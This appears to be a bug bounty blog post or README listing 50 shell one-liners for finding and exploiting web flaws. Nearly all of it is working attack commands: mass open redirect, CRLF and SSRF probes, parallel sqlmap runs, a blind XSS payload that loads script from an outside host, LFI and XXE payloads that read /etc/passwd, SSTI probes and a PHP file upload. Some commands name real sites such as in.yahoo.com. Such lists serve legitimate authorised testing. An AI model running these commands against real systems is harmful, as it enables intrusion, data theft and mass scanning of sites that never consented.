# bug-bounty-hunter-50-tools-command
Are you a bug bounty hunter on the lookout for powerful and efficient tools to add to your arsenal? Look no further! In today’s fast-paced world of web application security, time is of the essence, and the ability to quickly and effectively test for vulnerabilities can make all the difference in the success of a bug bounty program.

That’s why we’ve compiled a comprehensive list of 50 one-liner scripts that can help you with your vulnerability testing. These scripts cover a wide range of testing scenarios, from SQL injection and directory traversal to JWT testing and GraphQL testing. With these powerful one-liners at your disposal, you’ll be able to quickly and easily test for common vulnerabilities in web applications.

Some of these one-liners utilize well-known tools such as curl and grep, while others use more specialized tools like subjack and Sqlmap. Regardless of the tool, each one-liner is designed to be efficient and effective, allowing you to quickly identify and exploit vulnerabilities in your target application.

In addition to the technical benefits of these scripts, they also offer a level of convenience and ease-of-use that can save you valuable time and effort during the bug bounty process. Rather than having to manually perform each individual test, these one-liners allow you to automate many of the more repetitive and time-consuming aspects of vulnerability testing.

So if you’re looking to level up your bug bounty hunting game, these 50 powerful one-liners are an excellent place to start. With their combination of efficiency, effectiveness, and convenience, they’re sure to become an essential part of your bug bounty toolkit.




1. Open Redirect CheckO ne Liner
On Live Domains List (File containing Live Domains)
Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header (Location).

cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi'

On Parameters (File containing urls with parameters)
Explanation – Takes input of urls file which then passes to qsreplace which replaces the parameter value to the injected one. Then it passes it to rush which runs 40 workers parallely and checks if the injected value comes in response header(Location).

cat urls.txt | qsreplace "https://redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

Test Case 2 ->

cat urls.txt | qsreplace "redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

Test Case 3 ->

cat urls.txt | qsreplace "////;@redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

Test Case 4 ->

cat urls.txt | qsreplace "/////redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

On Headers (File containing Live Domains)
Explanation – Takes input of live domains as a list and append all the headers with the injected value in the request and checks if it reflected in response header (Location)

cat live-domains | rush -j40 'if curl -Iks -m 10 "$line" -H "CF-Connecting_IP: https://redirect.com" -H "From: root@https://redirect.com" -H "Client-IP: https://redirect.com" -H "X-Client-IP: https://redirect.com" -H "X-Forwarded-For: https://redirect.com" -H "X-Wap-Profile: https://redirect.com" -H "Forwarded: https://redirect.com" -H "True-Client-IP: https://redirect.com" -H "Contact: root@https://redirect.com" -H "X-Originating-IP: https://redirect.com" -H "X-Real-IP: https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: redirect.com" -H "From: root@redirect.com" -H "Client-IP: redirect.com" -H "X-Client-IP: redirect.com" -H "X-Forwarded-For: redirect.com" -H "X-Wap-Profile: redirect.com" -H "Forwarded: redirect.com" -H "True-Client-IP: redirect.com" -H "Contact: root@redirect.com" -H "X-Originating-IP: redirect.com" -H "X-Real-IP: redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "The URL $line with vulnerable header may be vulnerable to Open Redirection. Check Manually";fi'



2. SQL Injection Check OneLiner
On list of URLs
Explanation – Rush takes input urls file and parallely runs 20 workers of sqlmap. First it checks wheather if the URL is alive or not.

cat urls.txt | rush -j20 'if curl -Is "{}" | head -1 | grep -q "HTTP"; then echo "Running Sqlmap on '{}'"; sqlmap -u "{}" --batch --random-agent --dbs; fi'



3. Open Redirect Check based on Location Header
Explanation – If the URL has the response as 301,302,307, then it checks if the Location header value is present in the original url or not. If the value is present in the url or parameter, then it tries to replace it with the custom value, if it gets the reflected custom value in response header, then it alerts as open redirect found.

cat urls.txt | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi'



4. XSS Checks on list of Urls
Explanation – Takes input of urls file and passes it to dalfox tool for xss scanning and saves it to xss.txt file.

cat urls.txt | dalfox pipe --multicast -o xss.txt



5. CRLF Injection Check One Liner
On Live Domains
Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.

cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/%0D%0Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} may be vulnerable to CRLF Injection. Check Manually";fi'

On Live Urls with Parameters
Explanation – Takes input of urls file and passes it to qsreplace which replaces the value of parameters as the injected one and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.

cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'

Test Case 2 ->

cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'


Test Case 3 ->

cat urls.txt | qsreplace -a "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'

On Headers (Files containing live domains)
Explanation – If any header is vulnerable to crlf injection, then it alerts.

cat $1 | rush -j40 'if curl -Iks -m 10 "{}" -H "CF-Connecting_IP: %0d%0acrlf:crlf" -H "From: root@%0d%0acrlf:crlf" -H "Client-IP: %0d%0acrlf:crlf" -H "X-Client-IP: %0d%0acrlf:crlf" -H "X-Forwarded-For: %0d%0acrlf:crlf" -H "X-Wap-Profile: %0d%0acrlf:crlf" -H "Forwarded: %0d%0acrlf:crlf" -H "True-Client-IP: %0d%0acrlf:crlf" -H "Contact: root@%0d%0acrlf:crlf" -H "X-Originating-IP: %0d%0acrlf:crlf" -H "X-Real-IP: %0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "From: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Forwarded-For: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Wap-Profile: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Forwarded: %E5%98%8D%E5%98%8Acrlf:crlf" -H "True-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Contact: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Originating-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Real-IP: %E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %0D%0Acrlf:crlf" -H "From: root@%0D%0Acrlf:crlf" -H "Client-IP: %0D%0Acrlf:crlf" -H "X-Client-IP: %0D%0Acrlf:crlf" -H "X-Forwarded-For: %0D%0Acrlf:crlf" -H "X-Wap-Profile: %0D%0Acrlf:crlf" -H "Forwarded: %0D%0Acrlf:crlf" -H "True-Client-IP: %0D%0Acrlf:crlf" -H "Contact: root@%0D%0Acrlf:crlf" -H "X-Originating-IP: %0D%0Acrlf:crlf" -H "X-Real-IP: %0D%0Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} with vulnerable header may be vulnerable to CRLF Injection. Check Manually";fi'


6. SSRF Check One Liner
On Headers (File containing live domains)
Explanation – Injceted burp collaborator server in requested headers and issues a request and saves it in the output file including each request timing so that if one gets a hit, he can confirm by checking the request timing.

Replace $2 with your burp collaborator server.

cat live-domains | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt

On Urls containing params
Explanation – Takes urls list, replaces the params value to the burp collaborator server and passes it to rush for parallel working.

cat urls.txt | qsreplace "your.burpcollaborator.server" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt

Test Case 2 ->

cat params.txt | qsreplace "http://$1" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt


7. SpringBoot Actuator Check One Liner
On Live Domains
Explanation – Takes live domains list and checks wheather the springboot actuators are publicly accessible or not.

cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &

On Live urls with params
Explanation – Takes urls list and checks wheather the application is using springboot or not.

cat params.txt | rush -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'


8. Drop Blind XSS payload on list of Urls with params
Explanation – Takes urls file as input, replaces the param value with blind xss payload and issues the request with 40 workers running parallely.

cat urls.txt | qsreplace '"><script src="https://script.xss.ht"></script>' | rush -j40 'curl -sk "{}" -o /dev/null'


9. Reflection Check (XSS) on one domain by extracting Hidden params
Explanation – Extracts the hidden parameters from the page and checks wheather it can be vulnerable to xss or not.

curl -skL "https://in.yahoo.com" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://in.yahoo.com/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'



10. Find hidden parameters via Crawl on list of urls
Explanation – Takes urls list and extracts hidden parameters from the list of urls and saves unique params in the file.

cat alive.txt | rush 'curl -skL "{}" | grep "type\=\"hidden\"" | grep -Eo "name\=\"[^\"]+\"" | cut -d"\"" -f2 | sort -u' | anew params.txt



11. Find Secrets in Javascripts files via crawling
Explanation – Takes live domains as input, crawled using hakrawler tool which extracts javascript files  and then passes it to Secretfinder script which checks for sensitive data in the javascript files.

cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder



12. Fetch Domains from Wayback Archive (Input Root-Domains)
Explanation – Takes the input of root-domains file and extracts the domains from the wayback archive.

Root-domains example – gq1.yahoo.com, abc.yahoo.com, root.yahoo.com etc

cat root-dom.txt | rush 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{}/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sed 's/\.com.*/.com/' | sort -u'



13. Directory Bruteforce using dirsearch and ffuf
Explanation – Direcotry bruteforce using ffuf. Takes input of live domains and scans for direcotries & files.

cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
using dirsearch
Explanation – Direcotry bruteforce using dirsearch. Takes input of live domains and scans for direcotries & files.

cat alive.txt | xargs -I@ sh -c 'python3 /root/Tools/dirsearch/dirsearch.py -w /path/to/wordlist.txt -u @ -e php,html,json,aspx -t 100' | tee -a dirsearch



14. Crawl list of Domains
Explanation – Crawling list of domains parallely with 30 workers.

cat alive.txt | xargs -P30 -I@ gospider -c 30 -t 15 -a -s @ -d 3 | anew spider



15. Subdomain bruteforce using ffuf
Explanation – Bruteforce subdomains using ffuf tool.

ffuf -u https://FUZZ.domain.com -w /path/to/wordlist -v | grep "| URL |" | awk '{print $4}'



16. Log4J Scan on list of domains
Explanation – Takes live domains as input and scans for log4j vulnerabilities.

cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u "@"



17. Hunt XSS
cat targets.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
cat targets.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"



18. Hunt SQLi
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'



19. Hunt SSRF
findomain -t http://target.com -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net



20. Hunt LFI
gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'



21. Hunt Open Redirect
gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'


22. Hunt Prototype Pollution
subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"


23. Hunt CORS
gau http://vuln.target.com | while read url;do target=$(curl -s -I -H "Origin: https://evvil.com" -X GET $url) | if grep 'https://evvil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done


24. Extract .js
echo http://target.com | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
assetfinder http://vuln.target.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 


25. Extract URLs from comment
cat targets.txt | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]'


26. Dump In-scope Assets from HackerOne
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type]


27. Find live host/domain/assets
subfinder -d http://vuln.target.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u


28. Screenshot
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 


29. Blind SQL injection testing with time-based payloads
time curl -s 'https://target.com/search.php?q=1 AND sleep(5)--'


30. Directory traversal (path traversal) testing
curl 'https://target.com/page.php?page=../../../../etc/passwd'


31. WordPress version enumeration
curl -s 'https://target.com/readme.html' | grep 'Version'


32. Subdomain takeover testing using subjack
subjack -w subdomains.txt -a -t 100 -v -o takeover.txt -ssl


33. HTTP header injection testing
curl -H 'X-Forwarded-For: 127.0.0.1\r\nUser-Agent: Mozilla/5.0' 'https://target.com/'


34. File upload testing
curl -X POST -F 'file=@test.php' 'https://target.com/upload.php'


35. Cross-site request forgery (CSRF) testing
curl -X POST -d 'name=admin&password=123456&csrf_token=123456' 'https://target.com/login.php'


36. XXE (XML External Entity) injection testing
curl -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' 'https://target.com/xxe.php'


37. Get Content-Type
echo abc.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'


38. Fuzz with FFUF
assetfinder http://att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'


39. Extract URL from .apk file
apktool -d com.uber -o uberAPK; grep -Phro "(https?://)[\w\,-/]+[\"\']" uberAPK/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemes.android\|google\|goo.gl"


40. Information Disclosure
cat host.txt | httpx -path //server-status?full=true -status-code -content-length
cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length


41. Reflected XSS
subfinder -d abc.com | httprobe -c 100 > target.txt 
cat target.txt | waybackurls | gf xss | kxss
gospider -a -s abc.com -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'


42. SSTI to RCE
 waybackurls http://target.com | qsreplace "abc{{9*9}}" > fuzz.txt
 ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/


43. Dump In-scope Assets from chaos-bugbounty-list
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'


44. CORS (Cross-Origin Resource Sharing) testing
curl -I -H 'Origin: https://evil.com' 'https://target.com/api.php'


45. Blind SSRF (Server-Side Request Forgery) testing with time-based payloads
time curl -s 'https://target.com/api.php?url=http://evil.com&secret_token=123' -H 'X-Forwarded-For: 127.0.0.1'


46. JWT (JSON Web Token) testing with jwt_tool
jwt_tool.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -k secret


47. GraphQL testing with gqlmap
gqlmap.py -u 'https://target.com/graphql' -t GET --level 2


48. XXE (XML External Entity) injection testing with Burp Suite
curl -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' 'https://target.com/xxe.php' | base64 -w 0 | pbcopy
Then, paste the base64-encoded request into the “Paste from clipboard” feature in Burp Suite.



49. API testing with HTTPie
http https://target.com/api/v1/users/1 Authorization:'Bearer JWT_TOKEN'


50. HTML injection testing
curl -d '<script>alert("XSS")</script>' 'https://target.com/comment.php'


This one-liner sends a POST request with a script tag as the comment parameter. The script tag will be reflected in the response if HTML injection is possible, indicating a potential vulnerability for cross-site scripting (XSS) attacks.

Conclusion
In conclusion, we hope that these 50 powerful one-liners have given you a new set of tools to help you tackle the challenges of bug bounty hunting. The world of web application security is constantly evolving, and the ability to quickly identify and exploit vulnerabilities is more important than ever.

By using these scripts, you can save valuable time and effort during the vulnerability testing process, allowing you to focus on the most critical issues and maximize your rewards. With a little creativity and some technical know-how, you’ll be able to take your bug bounty game to the next level.

Remember, however, that with great power comes great responsibility. Always obtain permission before testing on any website or server, and be sure to follow ethical guidelines and responsible disclosure practices. Together, we can make the web a safer place for all users.

So go forth and hack responsibly, armed with these powerful one-liners as your trusty sidekick. Happy hunting!
